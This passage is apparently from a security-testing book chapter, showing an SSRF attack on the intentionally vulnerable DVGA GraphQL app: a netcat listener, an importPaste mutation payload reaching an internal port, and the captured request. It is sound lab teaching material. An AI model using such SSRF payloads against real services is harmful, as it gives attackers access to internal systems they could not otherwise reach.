    \n```\n# sudo docker exec -it dvga nc -lvp 7773\n\nlistening on [::]:7773 ...\n\
    ```\n\nNext, we’ll construct a payload to send an HTTP probe to the port Netcat\
    \ is binding to (7773), as shown in Listing 9-9.\n\n```\nmutation {\n  importPaste(scheme:\
    \ \"http\", host:\"localhost\", port:7773, path: \"/ssrf\") {\n    result\n  }\n\
    }\n```\n\nListing 9-9: A mutation query to abuse an SSRF vulnerability\n\nIf you\
    \ send this query, you should receive output similar to Listing 9-10 in your Netcat\
    \ listener.\n\n```\nconnect to [::ffff:127.0.0.1]:7773 from localhost:55554 ([::ffff:127.0.0.1]:55554)\n\
    GET /ssrf HTTP/1.1\nHost: localhost:7773\nUser-Agent: curl/7.83.1\nAccept: */*\n\
    ```\n\nListing 9-10: DVGA request reached the internal service\n\nThis shows that\
    \ DVGA made a GET request to an internal, unexposed port. Note that this port\
    \ is not directly accessible by the Kali machine; we’re using DVGA itself to reach\
    \ it, illustrating how an SSRF vulnerability can give an attacker access to services\
    \ they otherwise wouldn’t be able to reach directly. This SSRF attack is more\
    \ specifically a cross-site port attack (XSPA), which falls under the SSRF vulnerability\
    \ category.\n\nYou may have also noticed that Altair hangs after sending the importPaste\
    \ mutation in Listing 9-10. This happens because the Netcat listener we opened\
    \ won’t return a response, but Altair waits until it receives a response from\
